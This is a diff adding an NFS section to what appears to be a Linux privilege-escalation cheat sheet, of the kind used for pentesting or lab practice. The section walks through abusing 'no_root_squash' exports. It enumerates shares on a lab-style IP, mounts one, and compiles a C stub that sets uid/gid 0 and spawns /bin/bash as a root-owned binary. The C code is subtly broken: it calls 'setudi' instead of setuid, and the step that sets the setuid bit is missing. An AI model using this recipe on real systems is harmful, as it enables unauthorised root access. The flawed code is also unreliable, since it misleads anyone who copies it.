@@ -136,5 +136,59 @@ $ getcap -r / 2>/dev/null
 
 Look at [GTFOBins](https://gtfobins.github.io/) for leverage
 
+## NFS
 
+Check /etc/exports for "no_root_squash":
+```console
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+Look for mountable shares:
+```console
+$ showmount -e 10.10.193.66
+Export list for 10.10.193.66:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+
+Mount one shared dir with "no_root_squash":
+```console
+$ mkdir /tmp/shared
+$ sudo mount -o rw 10.10.193.66:/home/backup /tmp/shared/
+```
+
+Create file inside shared:
+```c
+int main(){
+        setgid(0);
+        setudi(0);
+        system("/bin/bash");
+        return 0;
+}
+```
+Compile the code:
+```console
+$ gcc root.c -o nfs -w
+
+#ls -la
+total 28
+drw-r--r-- 2 root root  4096 20. Feb 12:26 .
+drwxrwxrwt 1 root root   822 20. Feb 12:26 ..
+-rwxr-xr-x 1 root root 16712 20. Feb 12:26 nfs
+-rw-r--r-- 1 root root    71 20. Feb 12:26 root.c
+
+```
 
